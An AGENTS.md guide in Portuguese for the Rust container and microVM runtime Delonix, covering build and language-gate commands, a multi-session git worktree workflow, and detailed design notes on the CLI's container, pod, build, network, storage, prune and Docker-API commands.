# Delonix Runtime — guia do projeto (AGENTS.md)

Motor de **containers e microVMs daemonless, rootless-first, kernel-native, em Rust**.
Repositório **público** (`angolardevops/delonix-runtime`, Apache-2.0) — extraído do monorepo
privado `delonix-paas` (ver [README.md](README.md) para a arquitectura dos 14 crates).

## Comandos

```bash
cargo build --workspace               # tudo
cargo test  --workspace               # testes
cargo build -p delonix-runtime-bin    # a CLI `delonix` (ver secção "CLI" abaixo)
python3 scripts/lang_ratchet.py       # gate de língua (ver "Língua do código")
```

## Língua do código: inglês (LANG-01)

**Identificadores, comentários e mensagens escrevem-se em inglês.** O português
serve o operador, e chega-lhe pelo catálogo de tradução (`cmd::po`), nunca por
uma string escrita à mão no meio do código.

Isto não é uma política nova — é a política que o repo já tinha e nunca fez
cumprir. O `help` da CLI é autorado em inglês e traduzido para PT desde a
v0.32.2; tudo o que ficou em português ficou por ter **saltado** o catálogo.

**O gate:** `scripts/lang_ratchet.py` conta três dívidas — identificadores,
comentários e mensagens ao utilizador ainda em PT — contra
`scripts/lang_baseline.json`, e corre no CI (job `lang`).

É um **ratchet, não um tecto**, tal como o `ARG_HELP_PENDING` do
`help_i18n_tests`: falha se o número SUBIR (entrou português novo) **e** se
DESCER sem a linha de base ter sido baixada no mesmo commit. Um `<=` deixaria a
dívida a ler-se como verde para sempre.

```bash
python3 scripts/lang_ratchet.py --list --only identifiers   # o que falta
python3 scripts/lang_ratchet.py --update                    # baixar a base
```

Ao traduzir, `--update` e o ficheiro traduzido vão no **mesmo commit**.

**O léxico (`scripts/lang_pt_lexicon.txt`) não leva homógrafos.** `remove`,
`media`, `data`, `base`, `no`, `so`, `ate`, `ver`, `pos` e `seg` existem nas duas
línguas. `nas` foi pior: colide com **NAS**, o armazenamento, e à primeira
passagem deu seis falsos positivos que faziam comentários já ingleses contar como
dívida. Um contador com falsos positivos não é um contador — é ruído com um
número à frente.

**`num` FICA, e a medição é que decide — não a intuição.** É homógrafo («num» =
«em um» em PT, abreviatura de *number* em EN) e a regra acima sugere tirá-lo.
Medido a 2026-08-25, correndo o ratchet com e sem ele: dependem exclusivamente
do `num` **20 hits** — comments 3479→3465, identifiers 1050→1044. Lidos um a um,
**11 são falsos positivos** (`num`/`num_ok`/`cap_num`/`StringOrNum`, e quatro
comentários INGLESES que citam `cap_num`) e **9 são português genuíno** («num
runner LIMPO», «num apply falhado», «Só num manifesto»).

Não é o caso do `nas`, que dava seis falsos e zero reais. Aqui tirá-lo perde 9
detecções verdadeiras para eliminar 11 falsas, e obriga a baixar a linha de base
em 20 — folga permanente para vinte hits PT novos entrarem sem o gate dar por
isso. Fica como está.

O que é seguro é **não escrever identificadores novos chamados `num`**: um
`format!("{num:04}")` conta como dívida portuguesa. `number` ou `count` não têm
o problema, e são melhor inglês na mesma.

Acrescentar uma palavra ao léxico **sobe** a contagem e faz o gate falhar. Está
certo: significa que se descobriu dívida que já lá estava. Baixa a linha de base
no mesmo commit em que acrescentas a palavra.

## Método: um worktree por sessão (ler ANTES de editar)

**Várias sessões escrevem neste clone ao mesmo tempo.** Não é hipótese: medido a
2026-08-12, o HEAD da `main` mudou **quatro vezes** durante uma única sessão, três sessões
commitaram no mesmo intervalo, e duas regeneraram o MESMO `docs/guia-vm.html` com minutos de
diferença. Ao lado, o `git worktree list` tinha **oito** worktrees vivos, vários de sessões há
muito fechadas. Por isso:

1. **Criar o worktree antes da primeira edição** (`git worktree add`), com
   `CARGO_TARGET_DIR=<repo>/target` para reaproveitar o cache de build.
2. **No fim**: commitar no worktree → `git cherry-pick <sha>` na `main` → **correr os gates
   OUTRA VEZ na `main`** → push → remover. Um cherry-pick limpo **não** prova que compila: a
   base mudou desde que o worktree partiu, e é aí que a `main` cresceu quatro commits alheios.
3. **Remover as DUAS coisas**: `git worktree remove <path>` **e** `git branch -D <branch>` — o
   branch sobrevive ao worktree, e é assim que o lixo se torna invisível.

Três armadilhas medidas, todas com custo real:

- **Conflito no `AGENTS.md` é a norma, não a excepção** — várias sessões acrescentam à mesma
  lista («X não é Y») e ao fim do ficheiro. Resolver **mantendo os dois lados**: são entradas
  distintas, e escolher uma apaga o achado de outra pessoa.
- **`git checkout -- <caminho>` na árvore partilhada destrói WIP alheia** (reverte para o HEAD,
  sem aviso e sem stash). Aconteceu em `docs/` nesta sessão; nada se perdeu por sorte, porque a
  outra sessão já tinha commitado.
- **`git add -A`/`-u`/`.` absorve trabalho de outra sessão.** `git add <ficheiro> <ficheiro>`,
  sempre, e reconhecer cada ficheiro do `git status --short` como seu antes de commitar.

Um push rejeitado por divergência resolve-se com `git pull --rebase` — este repo tem histórico
linear e não leva merge commits.

## CLI (`delonix`)

O binário `delonix` (crate `delonix-runtime-bin`) é a CLI opensource completa deste motor —
homóloga ao Docker, distinta do `delonix`/`delonixctl` privados do `delonix-paas` (outro
repo/branch/remote, não afectados por nada aqui). Comandos agrupados semanticamente em vez de
uma lista plana, um módulo por grupo em `crates/delonix-runtime-bin/src/cmd/`:

- `delonix init` (v0.47.0) — o passo ANTES do `stack init`/`vm init`: olha para o directório,
  decide qual dos dois chamar e com qual dos onze templates, e **delega** (não gera nada de seu).
  `cmd/init.rs::detect` é puro sobre os nomes de ficheiro presentes, ordenado do mais específico
  para o mais genérico — um Django também tem `.py` e um Next.js também tem `package.json`, por
  isso a regra mais larga não pode ganhar só por ter sido verificada primeiro. **Explica-se
  sempre** (`detected go.mod → stack init --template go`): um palpite errado que se vê corrige-se
  com `-t`, um em silêncio produz um projecto que não bate certo com o código ao lado. Um
  `VMfile` manda para o `vm init`; um `docker-compose.yml` é o caso em que a resposta certa é
  **não gerar nada** (já corre nativamente com `delonix compose up`, e um 2.º manifesto dava-lhe
  duas fontes de verdade) — avisa, em vez de gerar na mesma. `delonix version` existe a par da
  flag porque `<ferramenta> version` é o que se escreve primeiro (git/docker/kubectl/podman
  respondem todos), e imprime o texto da flag VERBATIM para os dois não poderem divergir.
- `delonix container` — run/ps/stop/rm/exec/logs/**update**/**describe**/**kill**/**wait**/
  **restart**/**rename**/**port**/**attach** (v0.25.0, Docker/Podman CLI-verb parity). `kill -s
  <signal>` sends an arbitrary signal (name or number) without forcing a `Stopped` status — the
  real outcome (`Crashed` for anything that actually terminates the process) is picked up on the
  next observation, same as any other unexpected death; `wait` blocks and prints the real exit
  code **only when a `--restart` supervisor is the process's real parent** (it alone captures a
  genuine `waitpid` status) — a plain `-d` container with no supervisor still surfaces as
  `Crashed`/137 on death, a pre-existing architectural limit (the engine isn't the real parent),
  not a bug in `wait` itself. `exec -e/-w/-u` are per-call overrides (never persisted); `exec -w`
  also fixed a real bug found while adding it — `exec` used to hardcode `chdir("/")`
  unconditionally, ignoring the container's own configured `workdir` even with no `-w` at all.
  `logs --tail/--since/--timestamps` only work for containers run with `--log-cri` (the only log
  format with real per-line timestamps to filter/show — a clear error otherwise, never a silently
  blank column). `attach` is deliberately **output-only**: this engine keeps no live stdin
  conduit to an already-started detached container (no persistent per-container shim like
  containerd's), so `-i` is refused with a clear error pointing at `exec -it` instead. **Nome default
  angolano**: sem `--name`, o container chama-se `<rei>-<lugar>-NN` (ex.:
  `njinga-benguela-07`) — listas partilhadas com o kind-mode em `cmd/names.rs`;
  DETERMINÍSTICO do id (as 2 passagens do re-exec de `--net` convergem sem transporte),
  colisão avança para a próxima combinação, `dlx-<id>` só como último recurso. `run` aceita `-v/--volume` (nomeado ou bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, testado e funcional) e
  `--net host|none|<rede>`. `host`/`none` — comportamento original, inalterado, testado. `--net
  <rede-custom>` **FUNCIONA em rootless** via o **re-exec `nsenter … ip netns exec`** (a nota
  antiga dizia que não existia — ESTAVA DESACTUALIZADA): `infra::attach_container` cria a netns
  NOMEADA do lado do holder e `reexec_into_netns` (`cmd/container.rs`) re-executa o binário via
  `infra::join_argv` (`nsenter -t <holder_pid> -U -m -n … ip netns exec <netns>`); a 2ª passagem
  corre com `RunSpec.inherit_userns` (suprime `CLONE_NEWNET`/`CLONE_NEWUSER`, herda os do holder —
  o processo passa a ter privilégio no userns do holder). O `RunSpec.join_netns` por `setns`
  (que falhava com "netns do pod indisponível") é **código morto** — abandonado a favor do
  re-exec. **`--pod <netns>`** usa o MESMO mecanismo para juntar N containers à netns partilhada
  de um pod (ver `delonix pod` / `kind: Pod` abaixo). **GPU real via CDI (v0.28.0)**: `--gpus
  nvidia|all` e `--device nvidia.com/gpu=<nome|all>` (`cmd/cdi.rs`) — CONSOME specs CDI já gerados
  por `nvidia-ctk cdi generate` (`/etc/cdi`/`/var/run/cdi`), nunca faz a descoberta do driver
  sozinho (isso fica 100% dentro do `nvidia-ctk`, tal como no Docker/Podman/containerd reais).
  Deliberadamente NÃO é o modelo do hook legacy `nvidia-container-cli configure --pid=<pid>`
  (um 2º processo a `setns` para dentro do userns/mntns de OUTRO por PID — precisaria de
  `CAP_SYS_ADMIN` nesse userns alheio, o mesmo problema de privilégio cross-namespace que o
  `--net <rede-custom>` já resolve por re-exec, não por attach externo): os `deviceNodes`/
  `mounts`/`env` do spec traduzem-se para o MESMO `Vec<Mount>`/`Vec<String>` que `-v`/`--device`
  já alimentam, aplicados pelo PRÓPRIO init do container antes do `pivot_root` — zero modelo de
  privilégio novo, o mesmo mecanismo já rootless de sempre. Sem spec CDI nem `nvidia-ctk` no
  PATH, `--gpus nvidia`/um `--device nvidia.com/gpu=...` **recusa com erro claro e accionável**
  ANTES de criar nada (nunca cai em silêncio para o bind cru de `/dev/nvidia*`, que falharia a
  meio com um erro confuso do CUDA). `ldconfig -r <rootfs>` best-effort logo após os mounts em
  `setup_rootfs` (ainda antes do `pivot_root`) — substituto deliberadamente mais simples do hook
  `createContainer` real de um spec CDI (que precisa do protocolo OCI-hook-stdin-state, não
  implementado); um spec que declare hooks avisa (não silencioso) que não foram executados.
  `--gpus dri` continua inalterado (bind cru de `/dev/dri/*` — Mesa/VAAPI é open-source, já vem
  no pacote da própria imagem). **Por confirmar num host GPU real** (impossível neste sandbox):
  a precedência exacta `/etc/cdi` vs `/var/run/cdi`, e se o `ldconfig -r` chega como substituto
  dos hooks reais.
- `delonix pod` — **pods reais multi-container** (create/ls/describe/rm/logs). N containers
  partilham a **netns do pod** (mesmo IP, `localhost` entre si), como um Pod do k8s. `cmd/pod.rs`:
  cria uma netns SDN NOMEADA no holder (`pod-<nome>`, via `infra::attach_container`) e corre cada
  container com `--pod pod-<nome>` (o re-exec acima) + label `delonix.io/pod=<nome>`. **Membership
  sem store novo** — o estado deriva dos labels (`Store::list`), como `cluster`/`stack`. `rm`
  remove todos os membros + `detach` da netns. Reutiliza a normalização k8s→docker do
  `kind: Container` (`container::container_to_run_opts`/`pod_member_run_opts`); o `kind: Container`
  continua a aceitar SÓ 1 container (>1 → usa `kind: Pod`). **`kind: Pod`** no manifesto (mesmo
  schema `PodSpec`, N containers) + grupo `pods:` no `kind: Stack` + `--dry-run`. **Também tapa o
  gap do CRI root-mode** (`delonix-cri` chamava `delonix pod create/rm` que não existia).
  **Partilha de namespaces**: **netns** (Fase 1) + **IPC + UTS** (Fase 2) — o 1.º container segura
  o ipc/uts e os restantes juntam-se via `RunSpec.pod_infra_pid` (o `spawn` suprime
  `CLONE_NEWIPC/NEWUTS`, o `container_init` faz `setns` de `/proc/<pid>/ns/{ipc,uts}`); possível em
  rootless porque o re-exec `--pod` já os põe no userns do holder, onde o `setns` tem privilégio (a
  razão pela qual o `setns` antigo — `join_netns`, agora removido — falhava deixou de valer).
  **PID** (`shareProcessNamespace`, campo já no schema) é a Fase 3.
- `delonix image` — pull/ls/rm/export (bundle OCI para `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [contexto]` — único grupo com orquestração
  nova (as outras têm API pronta nas crates, isto é "ligar os fios"): sobe um container de
  trabalho (`sleep infinity`) POR ESTÁGIO, corre cada `RUN` via `exec`, aplica `COPY` no rootfs em
  disco, e empacota com `ImageStore::commit_flat_rootfs` (rootless) ou `commit_upper`+`build_image`
  (root). **Multi-stage** (`FROM ... AS <nome>` + `COPY --from=`) suportado — só o modo root
  (overlay) exige que o estágio FINAL seja uma imagem real (sem lineage OCI para um estágio
  clonado). **Cache de layers por instrução** (rootless only, `--no-cache` para saltar). **`--secret
  id=<nome>,src=<caminho>`** + **`RUN --mount=type=secret,id=<nome>[,target=][,required=]`** —
  bind-mount AO VIVO (`runtime::mount_live`/`unmount_live`, o mesmo primitivo do `container update
  --volume-add`) só durante a janela desse `RUN`; como o mount vive só no namespace de montagem já
  próprio do container de trabalho, o segredo nunca é visível do lado do host que o
  `commit_flat_rootfs`/cache lê — estruturalmente não pode chegar a uma layer. Validado ao vivo:
  valor lido durante o `RUN`, ausente (nem sequer um ficheiro vazio) na imagem final. `type=ssh`/
  `type=cache`/`type=bind` dão erro claro (nunca viram texto de shell literal). **`--platform
  linux/<arch>`** — resolve a imagem base do arch pedido (`resolve_or_pull_platform`, arch-aware:
  só reaproveita uma imagem local se o `config.architecture` guardado bater), carimba-o no
  resultado; preflight claro contra `/proc/sys/fs/binfmt_misc/qemu-<arch>` antes de arrancar um
  build cross-arch (o binfmt/qemu-user-static em si é um pré-requisito do HOST, não gerido por
  este motor — mesmo princípio do `docker run --privileged tonistiigi/binfmt` do buildx real).
  **`Delonixfile`**: sem `-f`, `default_build_file` (`cmd/build.rs`) procura `<contexto>/
  Delonixfile` antes de `Dockerfile` — mesma gramática (`parse_dockerfile` já suporta as extensões
  Delonix `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK` independentemente do nome do ficheiro);
  `Delonixfile` é só o nome canónico por omissão.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 com `delonix_vm::VmConfig`.
  **`ls --namespace <ns>`** filtra pelo namespace de isolamento e é o único caminho para o LER
  nesta listagem: a coluna `NAMESPACE` esconde-se sozinha (`drop_uninformative`) quando todas as
  linhas diriam `default`, por isso passar a flag imprime o valor tal e qual.
  **`prune` NÃO é o `container prune`.** Por omissão leva só o que nada referencia — locks de
  criação obsoletos, sockets/pid/console de VMs que já não existem, overlays sem registo — e
  deixa em paz toda a VM declarada, paradas incluídas. A razão é medida: na máquina onde isto
  foi escrito as 17 VMs estavam TODAS paradas, e a semântica do Docker teria apagado o
  laboratório inteiro. O teste de alcançabilidade é o que importa — `vms/` tinha `hadata`,
  `labdata` e `pbs`, três pastas com **53 GiB de discos VIVOS** citados pelos `.xml`/`.json` de
  VMs existentes, e nenhuma com nome de VM; uma varredura por nome chamava-lhes órfãos.
  `--stopped` opta pelo comportamento destrutivo, e diz na pré-visualização quantas máquinas leva.
- `delonix cluster prune` — o estado dos clusters que já não têm um único nó. Um cluster existe
  enquanto houver containers com a etiqueta `io.x-k8s.kind.cluster` (o `cluster ls` deriva-o
  assim, sem registo próprio), logo os nós removidos por outro caminho deixam para trás a pasta,
  o kubeconfig e — o que não é cosmético — o contexto no `~/.kube/config` a apontar para uma
  porta que entretanto pode ser de outra coisa. Reutiliza a limpeza do `kindmode::delete`; um
  cluster COM nós, mesmo parados, nunca é tocado.
- `delonix stack prune -f <manifesto>` — a metade de poda do `apply --prune`, isolada: remove o
  que o stack possui e o manifesto já não declara, sem criar nem convergir nada. Constrói o mesmo
  plano do `apply` e fica-lhe só com as mudanças `Delete`, para não haver uma segunda noção de
  posse a divergir do `destroy`. Como o `destroy` e ao contrário dos outros `prune`, não pergunta
  nada — o manifesto é a autorização, e o `--dry-run` é a pré-visualização.
- `delonix system prune` — a varredura global. **`--auto --threshold N` é o modo AGENDADO**:
  mede a ocupação do sistema de ficheiros que contém o estado e, abaixo do limiar, sai a 0
  sem ter tocado em nada — isso é sucesso, não um nada-feito para corrigir. A porta corre
  ANTES de abrir qualquer store. `--auto` implica `--force` (não há quem responda a um
  prompt num timer) e **nunca toca em volumes** — para esses o caminho é `volumes prune
  --namespace`. A percentagem é a do `df` (`used/(used+bavail)`, arredondada para cima), e
  não a ingénua `(blocks-bfree)/blocks`: esta conta os blocos reservados ao root como
  livres e dá ~5% a menos, que é exactamente a distância entre o limiar do GC (75) e o do
  alerta do thin pool (80). Se a ocupação não puder ser lida, **recusa** em vez de
  adivinhar. É o comando que o role `store_gc` do `delonix-deploy` agenda — e que até aqui
  não existia: `delonix prune --auto` devolvia exit 2, `unrecognized subcommand`.
- `delonix volumes` — create/ls/rm/inspect, wrapper fino sobre `VolumeStore`.
  **`prune` tem ÂMBITO POR DONO** (`prune::Scope`): sem flags varre só a raiz sem dono — o que
  sempre varreu — e ao fim DIZ quais os namespaces que não olhou; `--namespace <ns>` varre um
  inquilino (é o primitivo do teardown de tenant), `-A/--all-namespaces` varre tudo. Um volume
  de inquilino vive em `volumes/.ns/<ns>/<nome>` e o `VolumeStore::list` NÃO o vê por desenho —
  quem tem de contabilizar a loja inteira usa `list_all`, que devolve o dono agarrado a cada
  registo. **O âmbito limita o que se LEVA, nunca o que se OLHA**: um `kind: ShareVolume` é
  registado na sub-árvore do inquilino mas o `Storage` pai fica na raiz, com os dados da share
  DENTRO da árvore do pai — filtrar antes da derivação pai/filho faria `--namespace <t>` apagar
  dados na NAS.
- `delonix network` — ls/create/rm/inspect. **Dois stores em paralelo, deliberado**:
  `NetworkStore` (registo declarativo rico — drivers bridge/macvlan/ipvlan/overlay) e
  `infra::{network_create_with,network_remove}` (plano físico do holder netns rootless).
  **O nome da bridge tem UMA fórmula, `delonix_net::bridge_name`, e o plano físico é a
  autoridade** — é o `NetDef` que nomeia o dispositivo que o holder cria, e o `NetworkStore` só o
  RELATA (`ls`/`inspect`/`describe`). Tinha a sua própria (`dlxn{base:02x}{hash:04x}` contra
  `dlxn{hash:08x}`) e imprimia um dispositivo que não existe no host — medido em `lab-net`:
  `dlxne9623e` na CLI, `dlxn0536623e` no netns. Mesma família do `ingress ls` a dizer `allow` sobre
  uma porta bloqueada. Nada há a migrar: a bridge do `NetworkStore` é recalculada a cada `get` (o
  registo guarda `base=`), ao contrário do `NetDef`, que a persiste. Para os
  drivers `bridge` E `overlay`, `network create` orquestra os dois em conjunto — o `overlay` sobe
  o plano físico no holder (bridge + uplink VXLAN `dlxvx<vni>` a masterizá-la + FDB dos pares +
  WireGuard se cifrado, ver `realize_overlay`/`infra::set_vxlan`), porque é realizável sem
  privilégio de host (vive todo no netns do holder). Provado ao vivo: `network create --driver
  overlay --vni 42 --peer …` cria o device VXLAN (`id 42 dstport 4789 nolearning`, master na
  bridge) e semeia o FDB com os pares — validado até à fronteira single-node (o forwarding
  inter-nó exige um 2.º nó real, não testável no sandbox).
  **A lista de pares converge nos DOIS sentidos, e o buraco era TRIPLO** (v0.53.x): o
  `converge` só sabia AVISAR que remover não estava implementado, e o aviso cobria o registo
  `peers=` — mas ficavam também a entrada `00:00:00:00:00:00 dst <ip>` no **FDB** (é ela que faz
  este nó inundar para lá) e, num overlay cifrado, o **peer WireGuard**, ou seja um nó já
  retirado da malha com o canal cripto DE PÉ. Esse terceiro não estava em lista nenhuma e é o
  que tinha relevância de segurança. Ordem: **dataplane primeiro, registo em último** — se o FDB
  falhar, o registo ainda lista o par e o plano seguinte volta a propor a remoção; ao contrário,
  perdia-se a informação do que faltava desfazer. Um holder EM BAIXO é o único caso tratado como
  sucesso (o uplink vive na netns efémera e morreu com ele), e **diz-se em voz alta**.
  - **`peer_fdb_dst` e `Network::vxlan_dev()` são os donos únicos de duas regras.** A primeira
    («`wgIp` se cifrado, senão `nodeIp`») vivia só dentro do `realize_overlay`, e duplicá-la
    faria apagar a entrada ERRADA — o par removido a receber tráfego e um que devia ficar sem o
    receber. A segunda é HEX (`dlxvx002a` para o VNI 42): escrevi `format!("dlxvx{vni}")` na
    primeira versão e a deleção teria ido para um device inexistente, a reportar sucesso.
  - **BUG PRÉ-EXISTENTE que só o inverso revelou: o lado ADD nunca tocou no dataplane.** O
    `add_overlay_peer` escreve o registo e mais nada — quem semeia o FDB é o `realize_overlay`,
    que só corre no `create`. Medido: acrescentar pares por manifesto deixava-os no registo e
    FORA do FDB, com o `inspect` a jurar que o overlay os alcançava. Re-semeia-se com a lista
    FINAL (o `do_vxlan` só acrescenta o que falta), o que de passagem repõe o que um respawn do
    holder tenha levado.
  - **Validado ao vivo, as três camadas** (root isolado, contra `bridge fdb show` e `wg show`, e
    não contra o que o comando disse): overlay em claro (VNI 42) — par removido sai do FDB e do
    registo, pares acrescentados entram no FDB, e a armadilha do substring exercitada com
    `10.0.0.5` e `10.0.0.50` a coexistir (remover o `.5` deixa o `.50`; um `contains` levava os
    dois); overlay CIFRADO (VNI 77, interface `wgo00004d`) — o par desaparece do `wg show`, do
    FDB e do registo. **Continua por medir** que o tráfego para o nó retirado deixa mesmo de
    fluir: isso precisa de dois nós reais, e o que está provado é a mecânica.
  Já `macvlan`/`ipvlan` só ficam no
  `NetworkStore` e o `create` **AVISA alto** que a rede NÃO foi realizada (Realized=False,
  reason=DriverNotImplemented) em vez de fingir sucesso — o plano físico deles precisa de
  CAP_NET_ADMIN na init-netns do host, que o modelo rootless não tem.
  **«Realizável» não é «realizada», e a condição `Realized` respondia à segunda pergunta com a
  primeira**: saía inteiramente do YAML — `False` porque o documento dizia `macvlan`, nunca porque
  alguém tivesse olhado para a máquina. Uma rede cujo `NetDef` não existe (um `rm` a meio, um
  `ingress/` limpo) reportava `Realized=True`, o `stack plan` dizia «sem alterações», o
  `network ls` mostrava-a com bridge e subnet, e o `container run --net <nome>` falhava com «does
  not exist» — medido ao vivo. Passa a ler o `NetDef` (via `Env`, sondado UMA vez por plano) e
  **deliberadamente NÃO a bridge**: esta vive na netns efémera e num nó ocioso não existe, logo
  sondá-la daria por partida toda a rede saudável — a armadilha que fez o `NetworkRoute` planear
  contra o registo. Entra como CONDIÇÃO e não como campo comparado, porque um campo daria diff →
  `Replace` → e um replace de rede desliga todos os containers ligados a ela; e é saltada num
  `Create`, onde a rede está a ser construída por esse mesmo apply.
  **O `network_create_with_gateway` descartava o PREFIXO em silêncio** quando o `NetDef` já existia
  (o gateway já tinha sido corrigido antes, o prefixo não): dava `network inspect` a mostrar a subnet
  A com os containers a receber endereços da subnet B. Passa a RECUSAR — pode haver workloads já
  ligados com leases do prefixo registado, e mudar a bridge debaixo deles não é decisão de um
  `create`.
- `delonix storage` — armazenamento de REDE (NFS/CIFS-SMB/WebDAV) montável como volume, estilo
  PersistentVolume do k8s. `create/ls/inspect/rm/apply` + `kind: Storage`. Uma pasta de um NAS
  (TrueNAS/Synology/Nextcloud) vira um volume nomeado que qualquer container monta com `-v <nome>:/x`.
  Por baixo é um volume do `delonix-volume` com driver de rede (o `ensure_mounted` monta via
  `mount -t nfs|cifs|davfs`); a declaração amigável (server/share/credenciais) é traduzida no
  device/options por `storage::build_mount`. Password via cofre (`--password-secret` → chave
  `password` do segredo). Validado end-to-end com NFS real: um container LEU e ESCREVEU num volume de
  rede e a escrita chegou ao NAS (ver `examples/storage.yaml` + `examples/nas-vm-cloud-config.yaml`,
  a receita da VM Samba+NFS de validação). **Montar NFS/CIFS precisa de CAP_SYS_ADMIN** (root ou
  sessão privilegiada) — em rootless puro o `mount -t` falha claro.
- `delonix net httproute` — ls/apply/rm do **reverse-proxy L7/HTTP** (`kind: HTTPRoute`). Ver a
  secção "Reverse-proxy L7" abaixo. **Não confundir** com `delonix net ingress` (firewall L4 inbound).
- `delonix stack apply [-f delonix-manifest.yaml]` — ver secção "Manifesto/apply" abaixo.
- `delonix compose up|down|ps|logs|config [-f <ficheiro>] [-p <projecto>]` (v0.29.0) — suporte
  NATIVO a `docker-compose.yml` (Compose Spec v2.x), `cmd/compose.rs`. Um tradutor de esquema
  estrangeiro, da mesma família que `container::pod_to_run_opts` (Pod k8s) e
  `dockerapi::docker_config_to_run_opts` (API Docker): parser tipado à mão (sem dependência
  nova), traduzido directamente para `RunOpts` (containers, reaproveitando `cmd_run` tal-e-qual)
  ou para `ManifestDoc`s que reaproveitam `image`/`network`/`volume::apply` verbatim (mesma
  idempotência, mesmo hardening de input, zero lógica de criação duplicada). **`depends_on`** com
  as 3 condições (`service_started`/`service_healthy`/`service_completed_successfully`) via
  ordenação topológica do grafo de serviços (ciclo → erro claro, nunca uma ordem arbitrária) +
  espera pelo healthcheck real (inline do serviço ou o da própria imagem) — sem mudança nenhuma
  ao schema do motor/store. **Projecto** (`compose down/ps/logs`) = label
  `delonix.io/compose-project=<nome>` nos containers (mesma ideia de `pod.rs`'s `POD_LABEL`);
  redes/volumes não têm campo de labels, por isso usam nomeação DETERMINÍSTICA
  (`<projecto>_<nome>`, a mesma convenção do `docker compose` real) — `down` reconstrói os
  mesmos nomes a partir do ficheiro compose (reanalisado), sem registo próprio, mesma filosofia
  do `stack describe`/`cluster ls`. **Validado ao vivo de ponta-a-ponta** (Postgres+app): `web`
  só arrancou depois do `pg_isready` do `db` ter sucesso real; `compose down -v` removeu os 2
  containers + rede + volume sem deixar nada para trás; `up` idempotente numa 2ª chamada.
  **FEITO (2026-07-27)**: `working_dir:` — ganhou `container run -w/--workdir` (gap do motor
  inteiro, não só do compose: `RunOpts`/`Container` nunca tinham override de workdir na criação,
  só o `exec -w` já tinha um por-chamada; `c.workdir` já era aplicado no `chdir()` do init antes
  do `execve`, só faltava uma forma de o definir a partir de fora da imagem). `compose` passou a
  usar `RunOpts.workdir`. Validado ao vivo: `working_dir: /opt/app` → `pwd` dentro do container
  confirma `/opt/app`. **FEITO (2026-07-27)**: porta sem host explícito (`ports: ["80"]`, formas
  curta e longa) — em vez de recusar, atribui uma porta livre do host (`free_host_port`, bind a
  porta 0 + liberta de imediato; TOCTOU inerente e aceite, mesma técnica que qualquer atribuição
  aleatória de porta usa). Validado ao vivo: `compose up` com `ports: ["80"]` publicou de facto
  numa porta livre real, confirmado por `container port`.
  **Por fazer, documentado (nunca silencioso)**: `profiles`/`extends`/`configs`/`secrets`
  top-level (usa `kind: Secret` em vez disso)/multi-ficheiro (`-f a -f b`/`include:`),
  `build.target` (selecção de estágio), `deploy.replicas≠1`, `networks.*.ipv4_address` fixo,
  volumes anónimos (sem `source` explícito) — este último deliberadamente NÃO tentado ainda:
  precisa de semântica própria de nomeação/limpeza (quando é que um volume anónimo se apaga?
  `down` simples ou só `down -v`?) que merece ser pensada com calma, não decidida às pressas.
- `delonix serve docker-api [--addr unix://<socket>]` — fatia da **Docker Engine API** (`cmd/dockerapi.rs`)
  que basta para `docker version/ps/images/info` **e**, desde a v0.26.0, o ciclo de vida completo de
  um container via `DOCKER_HOST=unix://<socket>`: `POST /containers/create|start|stop|kill|wait|
  restart|rename`, `DELETE /containers/{id}`, `GET /containers/{id}/json`, todos delegando na MESMA
  `cmd_run`/`cmd_stop`/`cmd_kill`/etc. do CLI (zero duplicação). Simplificação deliberada:
  `create` já arranca de imediato (sem estado "created" dormente) — `start` numa já-a-correr devolve
  o **304** idempotente que o docker real também devolve, o que mantém o par `create`→`start` que o
  `docker compose up` usa a funcionar. **`exec`/attach interactivo (HTTP hijacking) fica fora de
  escopo**; `--restart` (política que precisa do supervisor `run_supervised`, um `fork()` cru) é
  **recusado com erro claro** em vez de arriscar um fork de um processo multi-thread (o supervisor
  assume um chamador single-threaded, verdade só para o CLI).
  **2 bugs reais encontrados e corrigidos ao validar contra um `docker` CLI real**: (1) um container
  desanexado morto ficava **zombie para sempre** (`ps` mostrava `<defunct>`, `docker inspect`
  continuava a dizer `Running`) — `spawn()` só devolve sem `waitpid` quando `detach: true`,
  inofensivo no CLI normal (o processo sai logo a seguir, o órfão é reparentado ao `init` real do
  host, que o reapa), mas este servidor NUNCA sai — é o pai real do container para sempre, e nunca
  chamava `waitpid`; corrigido com uma thread reaper dedicada (`waitpid(-1, ...)` em loop). (2) o
  **shim de logs** (`log_shim`, um `fork()` que nunca faz `execve` — corre para sempre a copiar o
  pipe do container para o ficheiro de log) só fechava o stdio herdado (fds 0/1/2); em long-lived
  como este servidor, herdava TAMBÉM os sockets de outras ligações HTTP vivas e ficava a segurá-los
  abertos para sempre — corrigido a fechar tudo menos o fd de origem logo após o fork
  (`libc::close_range`). **Limitação documentada, não bloqueante**: o subcomando de conveniência
  `docker run` (create+start num só comando) não devolve o controlo ao terminal de forma fiável
  contra este servidor (o `create`+`start`+`inspect`+`kill`+`wait`+`restart`+`rename`+`stop`+`rm`
  separados — o caminho que `docker compose` usa — foram todos validados correctos e instantâneos);
  a causa aparenta ser um comportamento interno do próprio CLI Go, não reproduzido com os comandos
  separados.

### Reorganização da raiz da CLI (v0.30.0, BREAKING, corte limpo sem aliases)

Bug report real do utilizador: a raiz do `delonix` tinha crescido para **26 subcomandos planos**
(`netns`/`flow`/`ingress`/`egress`/`httproute`/`tunnel`/`boot`/`cri`/`api`/`docker-api`/`kube`
lado a lado com `container`/`image`/`vm`/...) — fácil de invocar um sub-comando de baixo nível
como se fosse um comando principal por engano. Pedido explícito: agrupamento **profundo** +
**corte limpo** (sem aliases de retrocompatibilidade — nomes antigos removidos por inteiro).

- **`delonix net <x>`** (`cmd/net.rs`) agrupa a plumbing de rede/infra de baixo nível: `netns`
  (antigo `delonix netns`), `flow`, `ingress`, `egress`, `httproute`, `tunnel`, `boot`. Roteamento
  puro — cada braço delega no MESMO `run()` de sempre, zero mudança de comportamento, só o
  caminho da CLI para lá chegar.
- **`delonix serve <x>`** (`cmd/serve.rs`) agrupa os três "serve um protocolo num socket unix":
  `cri` (antigo `delonix cri`), `api` (antigo `delonix api`), `docker-api` (antigo `delonix
  docker-api`).
- **`delonix cluster kube generate`** — o antigo `delonix kube generate` dobrou para dentro de
  `cluster` (`ClusterCmd::Kube`), por ser outra faceta do mesmo grupo "Kubernetes" que `cluster
  apply`/`cluster kubeadm` já ocupam.
